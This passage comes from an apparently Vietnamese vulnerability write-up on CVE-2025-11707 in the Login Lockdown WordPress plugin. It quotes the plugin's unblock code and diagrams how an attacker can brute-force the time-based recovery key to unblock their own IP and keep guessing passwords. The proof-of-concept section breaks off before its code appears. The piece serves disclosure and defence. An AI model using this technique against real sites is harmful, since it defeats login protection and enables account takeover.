</div><p>Khi đoán trúng một <code>unblock_key</code> còn hiệu lực trong transient, IP hiện tại sẽ được <strong>mở khóa ngay lập tức</strong>, từ đó có thể tiếp tục thực hiện các lần đăng nhập thử mật khẩu.</p>
<p>=&gt; Điều này cho phép kẻ tấn công <strong>liên tục tự mở khóa cho chính mình</strong>, vô hiệu hóa hoàn toàn cơ chế chặn IP của plugin.</p></div><h3 class="heading-element" id="unlock"><span>Unlock</span>
  <a href="#unlock" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>Plugin đăng ký hook ở giai đoạn rất sớm của vòng đời request:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="loginlockdown.php v2.14" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">loginlockdown.php v2.14</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">add_action</span><span class="p">(</span><span class="s1">&#39;init&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;loginlockdown&#39;</span><span class="p">,</span> <span class="s1">&#39;init&#39;</span><span class="p">),</span> <span class="o">-</span><span class="mi">1</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Trong hàm <code>init()</code>, plugin gọi trực tiếp:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="loginlockdown.php v2.14" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">loginlockdown.php v2.14</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">LoginLockdown_Functions</span><span class="o">::</span><span class="na">handle_unblock</span><span class="p">();</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Điều này có nghĩa là <strong>mọi request tới WordPress</strong>, kể cả trước khi hiển thị trang đăng nhập hay kiểm tra xác thực, đều sẽ chạy logic mở khóa nếu tồn tại tham số:</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">loginlockdown_unblock</span><span class="o">=...</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>=&gt; Chỉ cần gửi một HTTP request bất kỳ tới site kèm tham số này là có thể kích hoạt logic unblock.</p>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="functions.php v2.14" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">functions.php v2.14</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">function</span> <span class="nf">handle_unblock</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="k">global</span> <span class="nv">$wpdb</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="c1">//phpcs:ignore missing nonce as this is called via a link in email or stored by user
</span></span></span><span class="line"><span class="cl">  <span class="nv">$options</span> <span class="o">=</span> <span class="nx">LoginLockdown_Setup</span><span class="o">::</span><span class="na">get_options</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;loginlockdown_unblock&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;global_unblock_key&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nx">wp_unslash</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;loginlockdown_unblock&#39;</span><span class="p">])))</span> <span class="p">{</span> <span class="c1">//phpcs:ignore
</span></span></span><span class="line"><span class="cl">    <span class="nv">$user_ip</span> <span class="o">=</span> <span class="nx">LoginLockdown_Utility</span><span class="o">::</span><span class="na">getUserIP</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$user_ip</span><span class="p">,</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;whitelist&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;whitelist&#39;</span><span class="p">][]</span> <span class="o">=</span> <span class="nx">LoginLockdown_Utility</span><span class="o">::</span><span class="na">getUserIP</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">update_option</span><span class="p">(</span><span class="nx">LOGINLOCKDOWN_OPTIONS_KEY</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;loginlockdown_unblock&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;loginlockdown_unblock&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span> <span class="c1">//phpcs:ignore
</span></span></span><span class="line"><span class="cl">    <span class="nv">$unblock_key</span> <span class="o">=</span> <span class="nx">sanitize_key</span><span class="p">(</span><span class="nx">wp_unslash</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;loginlockdown_unblock&#39;</span><span class="p">]));</span> <span class="c1">//phpcs:ignore
</span></span></span><span class="line"><span class="cl">    <span class="nv">$unblock_transient</span> <span class="o">=</span> <span class="nx">get_transient</span><span class="p">(</span><span class="s1">&#39;loginlockdown_unlock_&#39;</span> <span class="o">.</span> <span class="nv">$unblock_key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$unblock_transient</span> <span class="o">==</span> <span class="nv">$unblock_key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="nv">$user_ip</span> <span class="o">=</span> <span class="nx">LoginLockdown_Utility</span><span class="o">::</span><span class="na">getUserIP</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="c1">//phpcs:ignore no need to cache
</span></span></span><span class="line"><span class="cl">      <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">delete</span><span class="p">(</span> <span class="c1">//phpcs:ignore
</span></span></span><span class="line"><span class="cl">        <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">lockdown_lockdowns</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="k">array</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">          <span class="s1">&#39;lockdown_IP&#39;</span> <span class="o">=&gt;</span> <span class="nv">$user_ip</span>
</span></span><span class="line"><span class="cl">        <span class="p">)</span>
</span></span><span class="line"><span class="cl">      <span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$user_ip</span><span class="p">,</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;whitelist&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;whitelist&#39;</span><span class="p">][]</span> <span class="o">=</span> <span class="nx">LoginLockdown_Utility</span><span class="o">::</span><span class="na">getUserIP</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">      <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">      <span class="nx">update_option</span><span class="p">(</span><span class="nx">LOGINLOCKDOWN_OPTIONS_KEY</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Hàm này hỗ trợ hai cơ chế mở khóa IP.</p>
<ol>
<li><strong>Mở khóa bằng Global Unblock Key</strong></li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true" title="functions.php v2.14" data-open="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i><span class="title-inner">functions.php v2.14</span></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;loginlockdown_unblock&#39;</span><span class="p">])</span> 
</span></span><span class="line"><span class="cl">    <span class="o">&amp;&amp;</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;global_unblock_key&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="nx">sanitize_text_field</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;loginlockdown_unblock&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nv">$user_ip</span> <span class="o">=</span> <span class="nx">LoginLockdown_Utility</span><span class="o">::</span><span class="na">getUserIP</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$user_ip</span><span class="p">,</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;whitelist&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;whitelist&#39;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$user_ip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nx">update_option</span><span class="p">(</span><span class="nx">LOGINLOCKDOWN_OPTIONS_KEY</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div>
</div>
</div><p>Nếu tham số trùng với <strong>global key trong cấu hình</strong>, IP hiện tại sẽ được:</p>
<ul>
<li>Thêm vào whitelist</li>
<li>Không còn bị block vĩnh viễn</li>
</ul>
<p>Cơ chế này hoàn toàn phụ thuộc vào việc giữ bí mật <strong>global key</strong>.</p>
<p><figure><a class="lightgallery" target="_blank" href="/posts/2026-01-22-cve-2025-11707/global.png" title="Global key" data-thumbnail="/posts/2026-01-22-cve-2025-11707/global.png" data-sub-html="<h2>Global key</h2><p>Global key</p>"><img loading="lazy" src='/posts/2026-01-22-cve-2025-11707/global.png' alt="Global key" height="620" width="1133"></a><figcaption class="image-caption">Global key</figcaption>
  </figure></p>
<ol start="2">
<li><strong>Mở khóa bằng Recovery Key (Transient)</strong></li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;loginlockdown_unblock&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;loginlockdown_unblock&#39;</span><span class="p">])</span> <span class="o">==</span> <span class="mi">32</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$unblock_key</span> <span class="o">=</span> <span class="nx">sanitize_key</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;loginlockdown_unblock&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$unblock_transient</span> <span class="o">=</span> <span class="nx">get_transient</span><span class="p">(</span><span class="s1">&#39;loginlockdown_unlock_&#39;</span> <span class="o">.</span> <span class="nv">$unblock_key</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$unblock_transient</span> <span class="o">==</span> <span class="nv">$unblock_key</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">delete</span><span class="p">(</span><span class="nv">$wpdb</span><span class="o">-&gt;</span><span class="na">lockdown_lockdowns</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span><span class="s1">&#39;lockdown_IP&#39;</span> <span class="o">=&gt;</span> <span class="nv">$user_ip</span><span class="p">));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$user_ip</span><span class="p">,</span> <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;whitelist&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$options</span><span class="p">[</span><span class="s1">&#39;whitelist&#39;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$user_ip</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nx">update_option</span><span class="p">(</span><span class="nx">LOGINLOCKDOWN_OPTIONS_KEY</span><span class="p">,</span> <span class="nv">$options</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Mở rộng hoặc thu gọn khối mã" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
</div>
</div><p>Đây là cơ chế mở khóa dựa trên <strong>recovery key được lưu trong transient</strong>.
Plugin chỉ kiểm tra hai điều kiện:</p>
<ol>
<li>Tham số <code>loginlockdown_unblock</code> có độ dài đúng <strong>32 ký tự</strong> (dạng MD5)</li>
<li>Tồn tại transient <code>loginlockdown_unlock_&lt;key&gt;</code> với giá trị trùng khớp</li>
</ol>
<p>Nếu thỏa mãn, IP hiện tại sẽ được:</p>
<ul>
<li>Xóa khỏi bảng <code>lockdown_lockdowns</code></li>
<li>Thêm vào whitelist</li>
</ul>
<p>=&gt; IP được mở khóa ngay lập tức và không còn bị chặn trong các lần đăng nhập tiếp theo.</p>
<p>Key này đã được ta phân tích ở phần trước đó.</p>
<h2 class="heading-element" id="flow"><span>Flow</span>
  <a href="#flow" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><div class="diagram-container">
  <pre class="mermaid">flowchart TD
A["Attacker (Unauthenticated)"] 
--> B["Trigger multiple failed logins"]

B --> C["IP reaches max_login_retries"]

C --> D["IP is blocked (lockdown_lockdowns)"]

D --> E["Send recovery POST with admin email"]

E --> F["Plugin generates unblock_key = md5(time + wp_rand)"]

F --> G["Store transient loginlockdown_unlock_key (1 hour)"]

G --> H["Attacker brute-forces keys in ±1s window"]

H --> I["Send GET /?loginlockdown_unblock=guessed_key"]

I --> J{"Transient exists & matches?"}

J -->|Yes| K["Delete IP from lockdown_lockdowns"]

K --> L["Add IP to whitelist"]

L --> M["IP fully unblocked"]</pre>
  <pre class="mermaid-dark">flowchart TD
A["Attacker (Unauthenticated)"] 
--> B["Trigger multiple failed logins"]

B --> C["IP reaches max_login_retries"]

C --> D["IP is blocked (lockdown_lockdowns)"]

D --> E["Send recovery POST with admin email"]

E --> F["Plugin generates unblock_key = md5(time + wp_rand)"]

F --> G["Store transient loginlockdown_unlock_key (1 hour)"]

G --> H["Attacker brute-forces keys in ±1s window"]

H --> I["Send GET /?loginlockdown_unblock=guessed_key"]

I --> J{"Transient exists & matches?"}

J -->|Yes| K["Delete IP from lockdown_lockdowns"]

K --> L["Add IP to whitelist"]

L --> M["IP fully unblocked"]</pre>
  <pre class="mermaid-neutral">flowchart TD
A["Attacker (Unauthenticated)"] 
--> B["Trigger multiple failed logins"]

B --> C["IP reaches max_login_retries"]

C --> D["IP is blocked (lockdown_lockdowns)"]

D --> E["Send recovery POST with admin email"]

E --> F["Plugin generates unblock_key = md5(time + wp_rand)"]

F --> G["Store transient loginlockdown_unlock_key (1 hour)"]

G --> H["Attacker brute-forces keys in ±1s window"]

H --> I["Send GET /?loginlockdown_unblock=guessed_key"]

I --> J{"Transient exists & matches?"}

J -->|Yes| K["Delete IP from lockdown_lockdowns"]

K --> L["Add IP to whitelist"]

L --> M["IP fully unblocked"]</pre><div class="diagram-copy-btn" aria-label="Copy Mermaid code" role="button"><i class="fa-regular fa-clone" aria-hidden="true"></i></div>
<template><pre>flowchart TD
A["Attacker (Unauthenticated)"] 
--> B["Trigger multiple failed logins"]

B --> C["IP reaches max_login_retries"]

C --> D["IP is blocked (lockdown_lockdowns)"]

D --> E["Send recovery POST with admin email"]

E --> F["Plugin generates unblock_key = md5(time + wp_rand)"]

F --> G["Store transient loginlockdown_unlock_key (1 hour)"]

G --> H["Attacker brute-forces keys in ±1s window"]

H --> I["Send GET /?loginlockdown_unblock=guessed_key"]

I --> J{"Transient exists & matches?"}

J -->|Yes| K["Delete IP from lockdown_lockdowns"]

K --> L["Add IP to whitelist"]

L --> M["IP fully unblocked"]</pre></template>
</div><h2 class="heading-element" id="proof-of-concept-poc"><span>Proof of Concept (PoC)</span>
  <a href="#proof-of-concept-poc" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><ol>
<li>Tạo file <code>gen_key.php</code> để đoán unlock key sau khi bị block</li>
</ol>
<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
<div class="code-header language-php"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Chuyển đổi số dòng" role="button" title="Chuyển đổi số dòng"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Chuyển đổi xuống dòng" role="button" title="Chuyển đổi xuống dòng"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Sao chép vào bộ nhớ tạm" role="button" title="Sao chép vào bộ nhớ tạm"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
